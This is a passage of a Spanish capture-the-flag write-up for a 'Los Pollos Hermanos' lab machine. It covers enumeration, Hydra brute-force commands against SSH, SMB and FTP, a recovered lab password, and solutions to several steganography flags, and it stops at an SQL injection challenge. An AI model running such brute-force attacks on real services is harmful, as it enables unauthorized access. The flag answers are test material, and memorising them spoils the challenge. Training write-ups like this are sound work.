<td style="text-align: right;">2025-07-16 15:38</td>
<td style="text-align: right;">108K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menuQR.png"><u>menuQR.png</u></a></td>
<td style="text-align: right;">2025-07-18 15:31</td>
<td style="text-align: right;">53K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/nosotros.png"><u>nosotros.png</u></a></td>
<td style="text-align: right;">2025-07-15 11:26</td>
<td style="text-align: right;">402K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image28.gif"
style="width:0.20833in;height:0.22917in" alt="[TXT]" /></td>
<td><a
href="http://192.168.1.44/archivos/passwords.txt"><u>passwords.txt</u></a></td>
<td style="text-align: right;">2025-08-12 10:12</td>
<td style="text-align: right;">2.4K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/welcome.jpg"><u>welcome.jpg</u></a></td>
<td style="text-align: right;">2025-07-16 12:46</td>
<td style="text-align: right;">1.5M</td>
<td> </td>
</tr>
</tbody>
</table>
<p>El archivo passwords.txt contiene cientos de passwords,puede resultar
interesante…</p>
<p>El resto de urls que podemos encontrar al desplazarnos por la web
son:</p>
<p><a
href="http://192.168.1.44/index.html">http://192.168.1.44/index.html</a></p>
<p><a
href="http://192.168.1.44/menu.html">http://192.168.1.44/menu.html</a></p>
<p><a
href="http://192.168.1.44/localizacion.html">http://192.168.1.44/localizacion.html</a></p>
<p><a
href="http://192.168.1.44/nosotros.html">http://192.168.1.44/nosotros.html</a></p>
<p><a
href="http://192.168.1.44/privado.html">http://192.168.1.44/privado.html</a></p>
<p><a
href="http://192.168.1.44/cupones.html">http://192.168.1.44/cupones.html</a></p>
<p><a
href="http://192.168.1.44/banderas.php">http://192.168.1.44/banderas.php</a></p>
<p><a
href="http://192.168.1.44/moscas.php">http://192.168.1.44/moscas.php</a></p>
<p><img src="cookbook/media/image29.png"
style="width:2.86837in;height:1.43216in" /> <img
src="cookbook/media/image30.png"
style="width:2.85192in;height:1.41623in" /></p>
<p><img src="cookbook/media/image31.png"
style="width:2.84161in;height:1.41646in" /> <img
src="cookbook/media/image32.png"
style="width:2.84893in;height:1.41475in" /></p>
<p><img src="cookbook/media/image33.png"
style="width:2.85518in;height:1.41114in" /> <img
src="cookbook/media/image34.png"
style="width:2.82807in;height:1.3871in" /></p>
<p><img src="cookbook/media/image35.png"
style="width:2.8824in;height:1.41612in" /> <img
src="cookbook/media/image36.png"
style="width:2.8146in;height:1.39439in" /></p>
<p><strong>Contraseñas</strong></p>
<p>Ya tenemos una lista de usuarios y un diccionario de contraseñas
(passwords.txt), podemos usar <strong>Hydra</strong> para hacer ataque
de fuerza bruta contra un servicio.</p>
<p><img src="cookbook/media/image37.png"
style="width:5.63542in;height:2.83333in" /></p>
<p><img src="cookbook/media/image38.png"
style="width:4.83333in;height:5.05208in" /></p>
<p><strong>1️⃣ Si quieres probar contra SSH (puerto 22):</strong></p>
<p>hydra -L /home/kali/usuarios.txt -P /home/kali/passwords.txt
ssh://192.168.1.44</p>
<p>-L usuarios.txt → Lista de usuarios.</p>
<p>-P /home/kali/passwords.txt → Lista de contraseñas.</p>
<p>ssh://IP → Servicio y objetivo.</p>
<p><img src="cookbook/media/image39.png"
style="width:5.90556in;height:0.66667in" /></p>
<p><img src="cookbook/media/image40.png"
style="width:5.90556in;height:2.72222in" /></p>
<p><strong>2️⃣ Si quieres probar contra SMB (puertos
139/445):</strong></p>
<p>hydra -L /home/kali/usuarios.txt -P /home/kali/passwords.txt
smb://192.168.1.44</p>
<p><em>(En versiones antiguas de Hydra, SMB se llama smb o
smbnt)</em></p>
<p><strong>3️⃣ Si quieres probar contra FTP (puerto 21):</strong></p>
<p>hydra -L /home/kali/usuarios.txt -P /home/kali/passwords.txt
ftp://192.168.1.44</p>
<p>💡 <strong>Consejos CTF</strong>:</p>
<ul>
<li><p>Empieza probando en <strong>FTP</strong> o <strong>SMB</strong>
antes que en SSH: suelen tener contraseñas débiles y menos
restricciones.</p></li>
<li><p>Si alguna combinación usuario/contraseña funciona, apúntala y
pruébala en todos los servicios.</p></li>
</ul>
<p><strong>📁 Resumen de la información obtenida:</strong></p>
<p><strong>IP:</strong> 192.168.1.44</p>
<p><strong>S.O.:</strong> Ubuntu Server</p>
<p><strong>Hostname:</strong> lospollos</p>
<p><strong>Servidor:</strong> Apache</p>
<p><strong>Puertos:</strong></p>
<ul>
<li><p>21/tcp open ftp (Anonymous login allowed)</p></li>
<li><p>22/tcp open ssh OpenSSH Ubuntu</p></li>
<li><p>80/tcp open http Apache</p></li>
<li><p>139/tcp open Samba smb</p></li>
<li><p>445/tcp open Samba smb</p></li>
<li><p>31337/tcp closed Elite?</p></li>
</ul>
<p><strong>Usuarios:</strong></p>
<ul>
<li><p>fring</p></li>
<li><p>chow</p></li>
<li><p>hector</p></li>
<li><p>mike</p></li>
<li><p>lydia</p></li>
<li><p>victor</p></li>
<li><p>tyrus</p></li>
<li><p>saul</p></li>
</ul>
<p><strong>Contraseñas:</strong></p>
<p>Chow: Ch0w$up1</p>
<p><strong>URLs:</strong></p>
<p>http-title: Los Pollos Hermanos</p>
<p><a
href="http://192.168.1.44/archivos">http://192.168.1.44/archivos</a>
(directorio listable)</p>
<p><a
href="http://192.168.1.44/index.html">http://192.168.1.44/index.html</a></p>
<p><a
href="http://192.168.1.44/server-status">http://192.168.1.44/server-status</a></p>
<p><a
href="http://192.168.1.44/ver.php">http://192.168.1.44/ver.php</a></p>
<p><a
href="http://192.168.1.44/menu.html">http://192.168.1.44/menu.html</a></p>
<p><a
href="http://192.168.1.44/localizacion.html">http://192.168.1.44/localizacion.html</a></p>
<p><a
href="http://192.168.1.44/nosotros.html">http://192.168.1.44/nosotros.html</a></p>
<p><a
href="http://192.168.1.44/privado.html">http://192.168.1.44/privado.html</a></p>
<p><a
href="http://192.168.1.44/cupones.html">http://192.168.1.44/cupones.html</a></p>
<p><a
href="http://192.168.1.44/banderas.php">http://192.168.1.44/banderas.php</a></p>
<p><a
href="http://192.168.1.44/moscas.php">http://192.168.1.44/moscas.php</a></p>
<h1 id="section"></h1>
<h1 id="section-1"></h1>
<h1 id="resolución-de-moscas"><strong>Resolución de Moscas</strong></h1>
<h1 id="section-2"></h1>
<p><img src="cookbook/media/image41.jpeg"
style="width:5.90556in;height:3.37431in" /></p>
<p><strong><br />
</strong></p>
<h1 id="mosca-1-verificación-web-inicial"><strong>🐝 Mosca 1 –
Verificación Web Inicial</strong></h1>
<p><strong>Categoría:</strong> Criptografía/Steganografía<br />
<strong>Nivel:</strong> Básico-Intermedio<br />
<strong>Objetivo:</strong> Encontrar el valor correcto de la Mosca 1 y
enviarlo al sistema para que quede registrada como atrapada.</p>
<p><span id="_Toc207189803" class="anchor"></span><strong>🧠 Descripción
del reto</strong></p>
<p>En el código fuente de la página index.html vemos un comentario que
dice:</p>
<p><img src="cookbook/media/image42.png"
style="width:5.90556in;height:0.34028in" /></p>
<p><span id="_Toc207189804" class="anchor"></span><strong>🧰
Herramientas necesarias</strong></p>
<ul>
<li><p>Navegador web (Firefox o Chromium en Kali Linux)</p></li>
<li><p>Inspectores de código fuente HTML/JS (DevTools)</p></li>
<li><p>Terminal con herramientas como curl</p></li>
<li><p>Opcional: Burp Suite si deseas interceptar la petición
POST</p></li>
</ul>
<p><span id="_Toc207189805" class="anchor"></span><strong>🐾 Paso a paso
de resolución</strong></p>
<p><strong>1️⃣ Acceder a la página del reto</strong></p>
<p>firefox http://192.168.1.44/index.html</p>
<p>La página principal de la web Los Pollos Hermanos es mostrada.</p>
<p><strong>2️⃣ Inspeccionar código fuente</strong></p>
<p>En el código fuente de la página index.html vemos un comentario que
dice:</p>
<p>&lt;!— 🐔</p>
<p>45 6C 5F 61 75 64 69 6F 5F 42 69 65 6E 76 65 6E 69 64 6F 73 5F 65 73
63 6F 6E 64 65 5F 6C 61 5F 6D 6F 73 63 61 5F 31</p>
<p>--&gt;</p>
<p>Este código delata que es hexadecimal por varias razones claras:</p>
<p>🔍 <strong>1. Rango de caracteres</strong></p>
<p>Cada grupo está compuesto exclusivamente por dos caracteres que son
válidos en el sistema hexadecimal:</p>
<ul>
<li><p>Los caracteres hexadecimales válidos son: 0-9 y A-F (o
a-f).</p></li>
<li><p>Todos los bytes en tu cadena cumplen esta regla.</p></li>
</ul>
<p>Por ejemplo: 45, 6C, 5F, etc., están dentro del rango hexadecimal (00
a FF).</p>
<p>🔍 <strong>2. Formato típico de codificación hexadecimal</strong></p>
<p>Está estructurada en pares de dos dígitos, lo que es típico de la
representación en hexadecimal de bytes (cada byte = 2 dígitos hex).</p>
<p>Este formato se usa mucho en codificación de strings, datos binarios,
archivos, redes, etc.</p>
<p><strong>3️⃣ Conversión a binario</strong></p>
<p>Cada dígito hexadecimal se convierte en un grupo de cuatro bits
binarios (un nibble).</p>
<p>• 45 = 0100 0101</p>
<p>• 6C = 0110 1100</p>
<p>• 5F = 0101 1111</p>
<p>• 61 = 0110 0001</p>
<p>• 75 = 0111 0101</p>
<p>• 64 = 0110 0100</p>
<p>• 69 = 0110 1001</p>
<p>• 6F = 0110 1111</p>
<p>• 5F = 0101 1111</p>
<p>• 42 = 0100 0010</p>
<p>• 69 = 0110 1001</p>
<p>• 65 = 0110 0101</p>
<p>• 6E = 0110 1110</p>
<p>• 76 = 0111 0110</p>
<p>• 65 = 0110 0101</p>
<p>• 6E = 0110 1110</p>
<p>• 69 = 0110 1001</p>
<p>• 64 = 0110 0100</p>
<p>• 6F = 0110 1111</p>
<p>• 73 = 0111 0011</p>
<p>• 5F = 0101 1111</p>
<p>• 65 = 0110 0101</p>
<p>• 73 = 0111 0011</p>
<p>• 63 = 0110 0011</p>
<p>• 6F = 0110 1111</p>
<p>• 6E = 0110 1110</p>
<p>• 64 = 0110 0100</p>
<p>• 65 = 0110 0101</p>
<p>• 5F = 0101 1111</p>
<p>• 6C = 0110 1100</p>
<p>• 61 = 0110 0001</p>
<p>• 5F = 0101 1111</p>
<p>• 6D = 0110 1101</p>
<p>• 6F = 0110 1111</p>
<p>• 73 = 0111 0011</p>
<p>• 63 = 0110 0011</p>
<p>• 61 = 0110 0001</p>
<p>• 5F = 0101 1111</p>
<p>• 31 = 0011 0001</p>
<p>Al concatenar todos estos grupos de bits, obtenemos la cadena binaria
original:</p>
<p>01000101 01101100 01011111 01100001 01110101 01100100 01101001
01101111 01011111 01000010 01101001 01100101 01101110 01110110 01100101
01101110 01101001 01100100 01101111 01110011 01011111 01100101 01110011
01100011 01101111 01101110 01100100 01100101 01011111 01101100 01100001
01011111 01101101 01101111 01110011 01100011 01100001 01011111
00110001</p>
<p><strong>4️⃣ Conversión de Binario a Texto Plano</strong></p>
<p><a
href="https://es.convertbinary.com/de-binario-a-texto/">https://es.convertbinary.com/de-binario-a-texto/</a></p>
<p>Ahora, tomaremos cada grupo de ocho bits (un byte) de la cadena
binaria y lo convertiremos a su carácter ASCII correspondiente.</p>
<p>• 01000101 = E</p>
<p>• 01101100 = l</p>
<p>• 01011111 = _</p>
<p>• 01100001 = a</p>
<p>• 01110101 = u</p>
<p>• 01100100 = d</p>
<p>• 01101001 = i</p>
<p>• 01101111 = o</p>
<p>• 01011111 = _</p>
<p>• 01000010 = B</p>
<p>• 01101001 = i</p>
<p>• 01100101 = e</p>
<p>• 01101110 = n</p>
<p>• 01110110 = v</p>
<p>• 01100101 = e</p>
<p>• 01101110 = n</p>
<p>• 01101001 = i</p>
<p>• 01100100 = d</p>
<p>• 01101111 = o</p>
<p>• 01110011 = s</p>
<p>• 01011111 = _</p>
<p>• 01100101 = e</p>
<p>• 01110011 = s</p>
<p>• 01100011 = c</p>
<p>• 01101111 = o</p>
<p>• 01101110 = n</p>
<p>• 01100100 = d</p>
<p>• 01100101 = e</p>
<p>• 01011111 = _</p>
<p>• 01101100 = l</p>
<p>• 01100001 = a</p>
<p>• 01011111 = _</p>
<p>• 01101101 = m</p>
<p>• 01101111 = o</p>
<p>• 01110011 = s</p>
<p>• 01100011 = c</p>
<p>• 01100001 = a</p>
<p>• 01011111 = _</p>
<p>• 00110001 = 1</p>
<p><strong>5️⃣ Mensaje Final en Texto Plano</strong></p>
<p>Al juntar todos los caracteres ASCII, obtenemos el mensaje
original:</p>
<p>El_audio_Bienvenidos_esconde_la_mosca_1</p>
<p>Ahora tendremos que descargar el archivo de audio para poder
inspeccionarlo.</p>
<p>Para verla hay que abrir el archivo Bienvenidos.mp3 que se encuentra
en la carpeta ”archivos” con Audacity y ver el Espectograma. Se aprecia
la palabra “HEISENBERG”.</p>
<p><img src="cookbook/media/image43.png"
style="width:5.90556in;height:2.11806in" /></p>
<p><span id="_Toc207189806" class="anchor"></span><strong>🛡️ Notas
técnicas</strong></p>
<p><strong>🔹 Ocultación de texto en espectrogramas de
audio</strong></p>
<p><strong>1. ¿Qué es?</strong></p>
<ul>
<li><p>Es una forma de <strong>esteganografía en
audio</strong>.</p></li>
<li><p>En lugar de modificar directamente el sonido que se oye, se
manipula la representación <strong>frecuencia vs tiempo</strong> del
audio.</p></li>
<li><p>El mensaje (texto o imágenes) se convierte en un <strong>patrón
visual</strong> que puede ser visto en el espectrograma, pero no
detectado fácilmente al escuchar el audio.</p></li>
</ul>
<p><strong>2. Técnicas comunes</strong></p>
<ol type="1">
<li><p><strong>Inserción directa de frecuencias</strong>:</p>
<ul>
<li><p>Se añaden tonos a frecuencias muy altas (cercanas al límite
audible &gt;16 kHz).</p></li>
<li><p>El oído humano apenas lo percibe, pero en el espectrograma se ven
líneas o letras.</p></li>
</ul></li>
<li><p><strong>Modulación por amplitud/fase</strong>:</p>
<ul>
<li><p>Se “dibujan” formas en el espectrograma alterando la amplitud de
ciertas bandas de frecuencia en momentos específicos.</p></li>
<li><p>El resultado es un “graffiti sonoro” visible como texto o
símbolos.</p></li>
</ul></li>
<li><p><strong>Conversión de texto a imagen y luego a
espectrograma</strong>:</p>
<ul>
<li><p>El texto se renderiza como una imagen.</p></li>
<li><p>Esa imagen se convierte a un espectro de audio mediante
herramientas como <strong>Coagula</strong>, <strong>Sonic
Visualiser</strong> o scripts en Python (ej. usando FFT
inversa).</p></li>
<li><p>Al reproducirlo se escucha ruido extraño, pero en Audacity
aparece el mensaje.</p></li>
</ul></li>
</ol>
<p><strong>3. Cómo verlo en Audacity</strong></p>
<ol type="1">
<li><p>Abrir el archivo de audio.</p></li>
<li><p>En la pista, clic en el menú desplegable ►
Espectrograma.</p></li>
<li><p>Ajustar parámetros en ► Configuración del espectrograma:</p>
<ul>
<li><p><strong>Rango de frecuencia</strong>: subir el máximo (ej. hasta
20 kHz).</p></li>
<li><p><strong>Resolución FFT</strong>: aumentar (ej. 4096 o más) para
ver detalles finos.</p></li>
<li><p><strong>Escala logarítmica</strong>: más natural para leer
formas.</p></li>
</ul></li>
<li><p>Hacer zoom en la zona alta de frecuencias (normalmente donde se
ocultan los mensajes).</p></li>
<li><p>El texto aparecerá como <strong>patrones dibujados</strong>
(líneas, letras, símbolos).</p></li>
</ol>
<p><strong>4. Limitaciones</strong></p>
<ul>
<li><p>La ocultación aumenta el <strong>tamaño del archivo</strong> y
puede distorsionar el audio.</p></li>
<li><p>Si el audio se comprime con pérdida (ej. MP3), se suelen perder
las frecuencias ocultas.</p></li>
<li><p>Requiere un buen ajuste de parámetros en Audacity para que el
mensaje sea visible.</p></li>
</ul>
<p><strong>5. Herramientas relacionadas</strong></p>
<ul>
<li><p><strong>Audacity</strong> → Para visualizar
espectrogramas.</p></li>
<li><p><strong>Sonic Visualiser</strong> → Más especializado en análisis
de espectrogramas.</p></li>
<li><p><strong>Coagula</strong> → Convierte imágenes (incluido texto) en
espectrogramas de audio.</p></li>
<li><p><strong>FFmpeg</strong> → Puede generar espectrogramas
directamente con filtros (showspectrumpic).</p></li>
</ul>
<p><span id="_Toc207189807" class="anchor"></span><strong>🐝 Resultado
final</strong></p>
<p>La <strong>Mosca 1</strong> queda atrapada con el valor
'HEISENBERG'.</p>
<p><mark>Mosca 1 atrapada: 'HEISENBERG'</mark></p>
<p><strong><br />
</strong></p>
<h1 id="mosca-2-esteganografía-en-metadatos"><strong>🐝 Mosca 2 –
Esteganografía en Metadatos</strong></h1>
<p><strong>Categoría:</strong> Esteganografía / Forense digital<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Objetivo:</strong> Extraer el valor secreto oculto en un archivo
de imagen para capturar la Mosca 2 correctamente.</p>
<p><span id="_Toc207189809" class="anchor"></span><strong>🛠️
Herramientas necesarias</strong></p>
<ul>
<li><p>wget o navegador para descargar el archivo</p></li>
<li><p>file, strings, exiftool para metadatos</p></li>
<li><p>binwalk, zsteg, strings, grep para análisis profundo</p></li>
</ul>
<p><span id="_Toc207189810" class="anchor"></span><strong>📁 Fase 1 –
Descarga y reconocimiento del archivo</strong></p>
<p>En el código fuente de la página localizacion.html vemos un
comentario que dice:</p>
<p>&lt;!— 🐔</p>
<p>++++++++++[&gt;+++++++&gt;+++++++++++&gt;+++&gt;+++++++++++&gt;++++++++++&gt;+++&gt;+++++++++++&gt;+++++++++++&gt;++++++++++&gt;++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++&gt;++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;+++++++++++&gt;+++&gt;++++++++++&gt;++++++++++&gt;+++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++&gt;++++++++++&gt;+++&gt;+++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;++++++++++&gt;+++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++&gt;+++&gt;++++++++++&gt;++++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;++++++++++&gt;+++++++++++&gt;++++++++++&gt;++++++++++&gt;+++&gt;+++++++++++&gt;++++++++++&gt;+++&gt;++++++++&gt;+++++++++++&gt;++++++++++++&gt;++++++++++&gt;++++++++++&gt;+++&gt;+++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;-.&gt;.&gt;++.&gt;--.&gt;---.&gt;++.&gt;-----.&gt;-.&gt;---.&gt;+++.&gt;+.&gt;.&gt;++.&gt;.&gt;+.&gt;--.&gt;++.&gt;++++.&gt;+.&gt;++++.&gt;---.&gt;++++.&gt;-----.&gt;+.&gt;++.&gt;.&gt;+.&gt;++.&gt;+.&gt;-----.&gt;----.&gt;---.&gt;++.&gt;++.&gt;-----.&gt;+.&gt;+++.&gt;-----.&gt;.&gt;---.&gt;++.&gt;+.&gt;-----.&gt;----.&gt;-----.&gt;+.&gt;++.&gt;+.&gt;-----.&gt;-.&gt;+.&gt;.&gt;.&gt;-----.&gt;.&gt;---.&gt;++.&gt;--.&gt;---.&gt;++.&gt;---.&gt;+.&gt;-----.&gt;-.&gt;---.&gt;++.&gt;.</p>
<p>--&gt;</p>
<p><img src="cookbook/media/image44.png"
style="width:5.90556in;height:0.26458in" /></p>
<p>La cadena es un código en el lenguaje de programación Brainfuck, y se
puede identificar por varias características muy concretas:</p>
<p><strong>1. ✅ Solo usa 8 símbolos válidos</strong></p>
<p>Brainfuck únicamente utiliza los siguientes 8 caracteres como
instrucciones:</p>
<p>&gt; &lt; + - [ ] . ,</p>
<p>El código contiene exclusivamente estos símbolos (entre más de 700
caracteres), lo cual es la pista más evidente de que pertenece a
Brainfuck.</p>
<p><strong>2. ✅ Uso intensivo de bucles con [ y ]</strong></p>
<p>La secuencia ++++++++++[ al inicio es un patrón clásico en Brainfuck
para iniciar un bucle que sirve como multiplicador o generador de valor
base.</p>
<p>Los bucles [ y ] son usados para iterar mientras el valor actual del
puntero no sea 0, típico de bucles de inicialización en este
lenguaje.</p>
<p><strong>3. ✅ Patrones comunes de inicialización y escritura de
texto</strong></p>
<p>El inicio:</p>
<p>++++++++++[&gt;+++++++&gt;+++++++++++&gt;+++...</p>
<p>Es un patrón conocido para precargar celdas de memoria con valores
específicos antes de imprimir texto.</p>
<p>La parte final con muchas &gt;.&gt;+.&gt;---. y similares:</p>
<p>Son instrucciones típicas para imprimir caracteres uno tras otro con
. y manipular el puntero/memoria para moverse (&lt;, &gt;) y ajustar (+,
-).</p>
<p><strong>4. ✅ Ausencia de cualquier otro símbolo</strong></p>
<p>No hay letras, números, espacios ni puntuación (más allá del punto .
de Brainfuck), lo que excluye otros lenguajes.</p>
<p>Lenguajes como C, Python, Java, etc., usan muchos más caracteres y
estructuras (palabras clave, paréntesis, comillas, etc.).</p>
<p><strong>Brainfuck</strong> es un lenguaje de programación minimalista
y esotérico, diseñado para ser lo más simple y retorcido posible. A
pesar de su aspecto extraño, ¡es Turing completo! Solo tiene <strong>8
instrucciones</strong>, y funciona sobre una <strong>cinta de
memoria</strong> similar a una máquina de Turing.</p>
<p><strong>Conceptos básicos</strong></p>
<ul>
<li><p>Imagina una <strong>cinta</strong> de celdas (como un array) con
valores del 0 al 255.</p></li>
<li><p>Hay un <strong>puntero</strong> que señala una celda a la
vez.</p></li>
<li><p>Solo hay <strong>8 comandos</strong> para manipular esa cinta y
el puntero.</p></li>
</ul>
<p><strong>Los 8 comandos de Brainfuck</strong></p>
<table>
<colgroup>
<col style="width: 11%" />
<col style="width: 88%" />
</colgroup>
<thead>
<tr>
<th style="text-align: center;"><strong>Comando</strong></th>
<th style="text-align: center;"><strong>Significado</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>&gt;</td>
<td>Mueve el puntero una celda a la derecha</td>
</tr>
<tr>
<td>&lt;</td>
<td>Mueve el puntero una celda a la izquierda</td>
</tr>
<tr>
<td>+</td>
<td>Incrementa el valor en la celda actual</td>
</tr>
<tr>
<td>-</td>
<td>Decrementa el valor en la celda actual</td>
</tr>
<tr>
<td>.</td>
<td>Imprime el carácter ASCII de la celda actual</td>
</tr>
<tr>
<td>,</td>
<td>Lee un carácter de entrada (no usado en tu código)</td>
</tr>
<tr>
<td>[</td>
<td>Si la celda actual vale 0, salta al comando después del ]
correspondiente</td>
</tr>
<tr>
<td>]</td>
<td>Si la celda actual no vale 0, vuelve al comando después del [
correspondiente</td>
</tr>
</tbody>
</table>
<p><strong>Ejemplo breve</strong></p>
<p>+++++ → pone el valor 5 en la celda actual</p>
<p>[ → comienza un bucle que se repetirá 5 veces</p>
<p>&gt; + → mueve a la siguiente celda y suma 1</p>
<p>&lt; - → vuelve a la celda anterior y resta 1</p>
<p>] → repite el bucle mientras la celda inicial no sea 0</p>
<p>Este ejemplo copia el valor 5 en la celda siguiente (con valor 1 al
final del bucle).</p>
<p><strong>¿Por qué usarlo?</strong></p>
<ul>
<li><p><strong>No es práctico</strong>, pero es excelente para
<strong>desafíos mentales</strong>, <strong>obfuscación</strong> o
incluso <strong>esteganografía</strong>.</p></li>
<li><p>Lo usan en <strong>retos CTF</strong>, puzzles y demostraciones
de teoría de la computación.</p></li>
</ul>
<p><span id="_Toc207189811" class="anchor"></span><strong>🔎 Fase 2 –
Descifrando Brainfuck</strong></p>
<p>Podemos utilizar algún servicio online para descifrarlo:</p>
<p><a
href="https://md5decrypt.net/en/Brainfuck-translator/">https://md5decrypt.net/en/Brainfuck-translator/</a></p>
<p><strong>Traducido sería:</strong></p>
<p>&lt;!— 🐔</p>
<p>En la imagen del horario de esta página está escondida la Mosca 2</p>
<p>--&gt;</p>
<p><img src="cookbook/media/image45.png"
style="width:5.90556in;height:3.13056in" /></p>
<p>Esta pista nos lleva a analizar la imagen horario.jpg</p>
<p>En la imagen horario.jpg de la página localización.html se han
modificado los metadatos para incluir la mosca 2 en el campo Artist:</p>
<p>exiftool -overwrite_original \</p>
<p>-Artist="HECTOR_SALAMANCA" \</p>
<p>-Comment="Esta imagen tiene algo escondido" \</p>
<p>-UserComment="El Artist es la MOSCA 2" \</p>
<p>-XPComment="🐔" \</p>
<p>horario.jpg</p>
<p><span id="_Toc207189812" class="anchor"></span><strong>📊 Fase 3 –
Análisis de metadatos</strong></p>
<p><strong>Inspección con exiftool</strong></p>
<p>exiftool horario.jpg</p>
<p>Buscamos campos como:</p>
<ul>
<li><p>Comment</p></li>
<li><p>Lyrics</p></li>
<li><p>Encoded by</p></li>
</ul>
<p>🎯 Si encontramos algo como:</p>
<p>Artist: 'HECTOR_SALAMANCA'</p>
<p><img src="cookbook/media/image46.png"
style="width:5.4635in;height:5.60677in" /></p>
<p>➡️ ¡Bandera obtenida! – MOSCA 2= HECTOR_SALAMANCA</p>
<p><span id="_Toc207189813" class="anchor"></span><strong>✅ Fase Final
– Verificación</strong></p>
<p>Tras el análisis, el valor correcto extraído es:</p>
<p>'HECTOR_SALAMANCA'</p>
<p>En la interfaz web:</p>
<ul>
<li><p>Selecciona Mosca 2</p></li>
<li><p>Introduce 'HECTOR_SALAMANCA'</p></li>
</ul>
<p>Mensaje esperado:</p>
<p>✅ ¡Correcto! Has atrapado la Mosca 2 🐝</p>
<p>Flag aceptado: 'HECTOR_SALAMANCA'</p>
<p>Total de moscas atrapadas: 2 / 10</p>
<p><span id="_Toc207189814" class="anchor"></span><strong>🐝 Resultado
final</strong></p>
<p><mark>Mosca 2 atrapada: 'HECTOR_SALAMANCA'</mark></p>
<p><strong><br />
</strong></p>
<h1 id="mosca-3-código-qr"><strong>🐝 Mosca 3 – Código Qr</strong></h1>
<p><strong>Categoría:</strong> Criptografía / Misc<br />
<strong>Nivel:</strong> Inicial<br />
<strong>Flag real:</strong> 'TUCO_SALAMANCA'</p>
<p><span id="_Toc207189816" class="anchor"></span><strong>🛠️
Herramientas necesarias</strong></p>
<ul>
<li><p>[x] Lector de códigos Qr</p></li>
<li><p>[x] Editor Hexadecimal</p></li>
</ul>
<p><span id="_Toc207189817" class="anchor"></span><strong>📁 Fase 1 –
Localización de la pista</strong></p>
<p>En la página menú.html nos encontramos con una imagen de un código QR
que se llama menuQR.png.</p>
<p><img src="cookbook/media/image47.png"
style="width:2.03125in;height:2.03125in" /></p>
<p><span id="_Toc207189818" class="anchor"></span><strong>🔎 Fase 2 –
Leer código Qr</strong></p>
<p>Si lo leemos nos descubre el siguiente texto:</p>
<p><strong>Texto: Dentro de este QR encontrarás la Mosca 3</strong></p>
<p>Este Qr está creado con un servicio online que permite asociar texto
a un código Qr:</p>
<p><a href="https://generator-qr.com/">https://generator-qr.com/</a></p>
<p><span id="_Toc207189819" class="anchor"></span><strong>📤 Fase 3 –
Analizar código Qr</strong></p>
<p>Si abrimos la imagen con un editor Hexadecimal para poder podemos ver
al final que el archivo ha sido modificado y encontramos la Mosca 3:</p>
<p><img src="cookbook/media/image48.png"
style="width:5.90694in;height:3.98056in" /></p>
<p>✅ Valor confirmado. MOSCA3='TUCO_SALAMANCA'</p>
<p><span id="_Toc207189820" class="anchor"></span><strong>✅ Fase Final
– Verificación Web</strong></p>
<p>En la interfaz de retos:</p>
<ul>
<li><p>Selecciona <strong>Mosca 3</strong></p></li>
<li><p>Introduce 'TUCO_SALAMANCA'</p></li>
</ul>
<p>Resultado:</p>
<p>✅ ¡Correcto! Has atrapado la Mosca 3 🐝</p>
<p>Flag aceptado: 'TUCO_SALAMANCA'</p>
<p>Total de moscas atrapadas: 3 / 10</p>
<p><span id="_Toc207189821" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p><strong>Lectura del QR</strong>: análisis en capa de aplicación
(texto asociado).</p></li>
<li><p><strong>Editor Hexadecimal</strong>: análisis en capa de
archivo/binario, para descubrir contenido añadido fuera de
especificaciones.</p></li>
<li><p>El reto enseña la importancia de <strong>no confiar en la primera
capa visible</strong> de un objeto digital.</p></li>
<li><p>Este reto combina <strong>esteganografía básica en un
PNG</strong> con <strong>uso de un QR como señuelo</strong>. La clave
estaba en saber que el QR por sí solo no contenía la solución, sino que
había que examinar el archivo binario con herramientas de bajo
nivel.</p></li>
</ul>
<p><span id="_Toc207189822" class="anchor"></span><strong>🐝 Resultado
final</strong></p>
<p><mark>Mosca 3 atrapada: 'TUCO_SALAMANCA'</mark></p>
<p><strong><br />
</strong></p>
<h1
id="mosca-4-simulación-de-inyección-sql-en-formulario-web"><strong>🐝
Mosca 4 – Simulación de Inyección SQL en Formulario Web</strong></h1>
<p><strong>Categoría:</strong> Criptografía/Web Exploitation/Inyección
SQL (SQLi)<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Mosca capturada:</strong> 'MIKE_EHRMANTRAUT'</p>
<p><span id="_Toc207189824" class="anchor"></span><strong>🧰
Herramientas necesarias</strong></p>
<ul>
<li><p>Navegador (Firefox o Chromium)</p></li>
<li><p>DevTools para inspección</p></li>
<li><p>Burp Suite opcional para interceptar peticiones</p></li>
<li><p>Conocimientos básicos de lógica SQL y vulnerabilidades</p></li>
</ul>
<p><span id="_Toc207189825" class="anchor"></span><strong>📁 Descifrando
la pista</strong></p>
